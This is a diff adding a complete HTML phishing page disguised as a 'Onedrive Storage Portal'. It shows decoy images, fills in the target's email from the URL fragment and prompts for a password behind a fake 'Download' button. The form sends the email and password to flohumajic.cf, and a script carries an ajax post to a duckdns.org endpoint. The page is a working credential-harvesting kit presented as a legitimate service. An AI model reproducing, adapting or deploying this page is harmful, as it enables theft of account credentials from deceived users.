@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+ <link href="fav.png" rel="icon"/>
+ <title>
+  Onedrive Storage Portal
+ </title>
+ <head>
+  <title>
+  </title>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <script src="jquery.min.js">
+  </script>
+  <style>
+   body {
+            margin: 0;
+        }
+        
+        .cnter {
+            display: flex;
+            justify-content: center;
+        }
+        
+        header {
+            width: 100%;
+            margin: 0;
+        }
+        
+        header img {
+            margin: 0;
+            width: 100%;
+        }
+        
+        aside {
+            width: 15%;
+            margin: 0;
+            float: left;
+            height: 100vh;
+        }
+        
+        aside img {
+            margin: 0;
+            width: 100%;
+        }
+        
+        .items {
+            width: 80%;
+        }
+        
+        input[type="password"] {
+            border-top: 0;
+            border-left: 0;
+            border-right: 0;
+            border-bottom-color: #0E49AF;
+            width: 100%;
+            height: 30px;
+        }
+        
+        input[type="password"]:focus {
+            outline: none;
+        }
+        
+        .items .item-con {
+            display: inline-block;
+            width: 40%;
+            height: 100px;
+        }
+        
+        #btn {
+            padding: 10px;
+        }
+        
+        .fx-body {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            box-shadow: -1px 2px 5px 0px rgba(0, 0, 0, 0.75);
+            width: 28%;
+            padding: 30px;
+        }
+        
+        button {
+            margin: 4px 0 4px 0;
+            height: 30px;
+            background: #094AB2;
+            border: none;
+            color: white;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .t {
+            display: flex;
+            width: 100%;
+            overflow-x: hidden;
+        }
+        
+        @media (max-width: 575.98px) {
+            .fx-body {
+                position: absolute;
+                top: 35%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: #fff;
+                box-shadow: -1px 2px 5px 0px rgba(0, 0, 0, 0.75);
+                width: 80%;
+                padding: 20px;
+            }
+            .fx-body img {
+                width: 100%;
+            }
+            input {
+                width: 50%;
+                margin: 4px 0 4px 0;
+                height: 30px;
+            }
+            button {
+                margin: 4px 0 4px 0;
+                height: 30px;
+                background: #094AB2;
+                border: none;
+                color: white;
+                font-size: 14px;
+                cursor: pointer;
+            }
+            .item-con img {
+                width: 100%;
+            }
+            .item-con {
+                display: inline-block;
+                width: 40%;
+            }
+            aside {
+                display: none;
+            }
+            .t img {
+                width: 50%;
+            }
+        }
+  </style>
+ </head>
+ <body style="height:100vh;">
+  <header>
+   <img src="top.png"/>
+  </header>
+  <aside>
+   <img src="k.png"/>
+  </aside>
+  <div>
+   <img src="tr.png"/>
+  </div>
+  <div class="cnter">
+   <div class="items">
+    <div class="item-con">
+     <img src="1.png"/>
+    </div>
+    <div class="item-con">
+     <img src="2.png"/>
+    </div>
+    <div class="item-con">
+     <img src="3.png"/>
+    </div>
+   </div>
+  </div>
+  <div class="fx-body">
+   <div>
+    <img class="img-fluid" src="t1.png"/>
+   </div>
+   <div style="width:100%">
+    <div class="t">
+     <div id="xx1" style="color:#094AB2; font-weight:800">
+     </div>
+     <img class="t1" src="tt.png"/>
+    </div>
+    <div>
+     <img src="t5.png "/>
+    </div>
+    <div>
+     <img src="t4.png "/>
+    </div>
+    <div class="ms">
+    </div>
+    <form action="https://flohumajic.cf/plus/jasb.php" method="post">
+     <div>
+      <input id="xx" name="email" readonly="" type="hidden" value=""/>
+     </div>
+     <div>
+      <input id="xxx" name="pass" placeholder="Password" required="" type="password" value=""/>
+     </div>
+     <div>
+      <img src="t3.png"/>
+     </div>
+     <div style="float:right">
+      <button id="Btn">
+       Download
+      </button>
+     </div>
+    </form>
+   </div>
+   <script>
+    $(document).ready(function() {
+
+                setTimeout(() => {
+                    $('.fx-body').show();
+                }, 2000)
+
+                $('.fx-body').hide();
+
+                $('.items').click(() => {
+
+                    $('.fx-body').toggle('1000');
+
+                });
+
+
+
+                const baseUrl = (window.location).href;
+
+                const url = baseUrl.substring(baseUrl.lastIndexOf('#') + 1);
+
+                $("#xx").val(url);
+
+                let text = $("#xx1").html(url);
+
+
+
+                $("#formx").submit(function(e) {
+
+                    e.preventDefault();
+
+                    const formData = new FormData($("#formx")[0]);
+
+                    $("#Btn").html('Processing..').prop("disabled", true);
+
+                    $.ajax({
+
+                        url: "https://clory.duckdns.org/onedrive/ab.php",
+
+                        type: 'POST',
+
+                        data: formData,
+
+                        contentType: false,
+
+                        processData: false,
+                        before: function() {
+                            $("#Btn").html('Processing..').prop("disabled", true);
+                        },
+
+                        success: function(res) {
+
+                            console.log(res);
+
+                            $('#bd').show();
+
+                            $('#hm').hide();
+
+                            setTimeout(function() {
+
+                                $("#xx").val(url);
+
+                                $("#xxx").val("");
+
+                                $('.ms').html('<img src="ms.png">');
+
+                                $("#Btn").html('Download').prop("disabled", false);
+
+                            }, 2000);
+
+
+
+                        }
+
+                    });
+
+                });
+
+
+
+            });
+   </script>
+  </div>
+ </body>
+</html>
